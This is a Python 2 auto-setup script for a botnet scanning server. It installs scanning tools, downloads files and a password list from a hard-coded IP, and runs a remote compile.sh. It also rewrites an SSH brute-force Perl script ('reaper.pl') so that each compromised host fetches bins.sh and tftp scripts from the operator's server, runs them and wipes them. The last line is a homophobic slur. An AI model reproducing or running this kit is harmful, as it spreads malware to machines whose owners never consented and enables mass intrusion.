import subprocess

def cri(cmd):
    subprocess.call(cmd, shell=True)
def jack(file_name, line_num, text):
  lines = open(file_name, 'r').readlines()
  lines[line_num] = text
  out = open(file_name, 'w')
  out.writelines(lines)
  out.close()

print '\x1b[1;37m Scanning Server Auto-Setup Created By \x1b[0;31mFlexingOnLamers'

print("Installing Needed Dependencies..")
cri('yum update -y')
cri('yum install python-paramiko gcc screen nano wget httpd iptables perl -y')
cri('yum install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -y')
cri('yum install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -y')
cri('yum install epel-release -y')
cri('yum install gengetopt -y')
cri('yum install python-paramiko gcc screen nano wget httpd iptables perl -y')
cri('yum install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -y')
cri('yum install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -y')
cri('yum install epel-release -y')
cri('yum install gengetopt -y')
print("Now Installing Needed Scripts..")
cri('wget -q http://158.69.204.184/class -O class')
cri('wget -q http://158.69.204.184/dup -O dup')
cri('wget -q http://158.69.204.184/g -O g')
cri('wget -q http://158.69.204.184/update -O update')
cri('wget -q http://158.69.204.184/pass_file -O pass_file')
cri('wget -q http://158.69.204.184/s -O s')
cri('wget -q https://pastebin.com/raw/bnAgb8hT -O reaper.pl')
cri('wget -q http://158.69.204.184/masscan -O masscan')
ip = raw_input("\x1b[1;37mEnter Your Server IP:\x1b[1;35m")
jack('reaper.pl', 19,  "                        $channel->exec('cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://"+ ip +"/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp "+ ip +" -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g "+ ip +"; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh; rm -rf *');")
print("Now Installing NETSSH2 and CPAN")
cri('yum install cpan wget curl glibc.i686 -y')
cri('cpan force install Parallel::ForkManager')
cri('cpan force install IO::Socket')
cri('cpan force install IO::Select')
cri('wget http://rbxmarketsourcealso000isbae.000webhostapp.com/compile.sh; sh compile.sh; rm -rf compile.sh')
cri('yum install gcc php-devel php-pear libssh2 libssh2-devel libpcap -y')
cri('pecl install -f ssh2')
cri('touch /etc/php.d/ssh2.ini')
cri('echo extension=ssh2.so > /etc/php.d/ssh2.ini')
cri('cpan force install Net::SSH2')
print("Now installing ZMAP")
cri('wget https://github.com/zmap/zmap/archive/v2.1.0.tar.gz')
cri('tar -xvf v2.1.0.tar.gz')
cri('cd zmap-2.1.0')
cri('flex -o "src/lexer.c" --header-file="src/lexer.h" "src/lexer.l"')
cri('byacc -d -o "src/parser.c" "src/parser.y"')
cri('mkdir /etc/zmap')
cri('cp conf/* /etc/zmap')
cri('cmake -DENABLE_HARDENING=ON')
cri('make')
cri('make install')
print("Finished faggot")